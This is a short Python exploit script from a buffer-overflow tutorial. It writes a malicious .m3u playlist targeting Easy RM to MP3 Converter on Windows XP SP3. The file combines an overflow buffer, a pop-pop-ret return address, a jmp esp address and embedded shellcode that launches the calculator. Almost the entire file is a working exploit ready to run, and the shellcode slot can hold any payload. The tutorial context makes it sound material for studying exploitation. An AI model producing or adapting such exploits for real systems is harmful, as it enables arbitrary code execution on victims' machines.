# Corelan exploit writing tutorial 2 
# Easy RM to MP3 exploit for Windows XP SP3
# https://www.corelan.be/index.php/2009/07/23/writing-buffer-overflow-exploits-a-quick-and-basic-tutorial-part-2/
# Tutorial 2 - part 2 - pop ret 
import struct

fh = open("pop-pop-ret.m3u", "w")
junk = ''
for i in range(0,26072):
  junk += b'\x41'

# struct.pack
# < indicates little endian
# I indicates integer value input

# this address was found searching address space of
# ModLoad: 01af0000 01b61000   C:\Program Files\Easy RM to MP3 Converter\MSRMCcodec00.dll
# for opcodes in order: 58 5d c3
# s 01af0000 l 01b61000 58 5d c3
# on the Windows XP SP3 box
eip = struct.pack('<I', 0x01b16a10)

preshellcode = 'XXXX'

# jmp esp location from tutorial 1
jmpesp = struct.pack('<I', 0x01d2f23a)

buf = ''
for i in range(0,8):
  buf += '\x90' # add 8 more bytes (the first pop in the pop pop ret will consume these bytes)

buf += jmpesp

# Actual working shellcode from 
# https://code.google.com/p/win-exec-calc-shellcode/downloads/detail?name=win-exec-calc-shellcode-302.zip 
buf += ("\x31\xc9\x49\x31\xd2\xe3\x47\x52\x68\x63\x61\x6c\x63\x89\xe6\x52\x56\x64\x8b\x72\x30\x8b\x76\x0c\x8b\x76\x0c\xad\x8b\x30" + \
"\x8b\x7e\x18\x8b\x5f\x3c\x8b\x5c\x1f\x78\x8b\x74\x1f\x20\x01\xfe\x8b\x4c\x1f\x24\x01\xf9\x0f\xb7\x2c\x51\x42\xad\x81\x3c" + \
"\x07\x57\x69\x6e\x45\x75\xf1\x8b\x74\x1f\x1c\x01\xfe\x03\x3c\xae\xff\xd7\x6a\x60\x5a\x68\x63\x61\x6c\x63\x54\x59\x48\x83" + \
"\xec\x28\x65\x48\x8b\x32\x48\x8b\x76\x18\x48\x8b\x76\x10\x48\xad\x48\x8b\x30\x48\x8b\x7e\x30\x03\x57\x3c\x8b\x5c\x17\x28" + \
"\x8b\x74\x1f\x20\x48\x01\xfe\x8b\x54\x1f\x24\x0f\xb7\x2c\x17\x8d\x52\x02\xad\x81\x3c\x07\x57\x69\x6e\x45\x75\xef\x8b\x74" + \
"\x1f\x1c\x48\x01\xfe\x8b\x34\xae\x48\x01\xf7\x99\xff\xd7")

fh.write(junk+eip+preshellcode+buf)
fh.close()
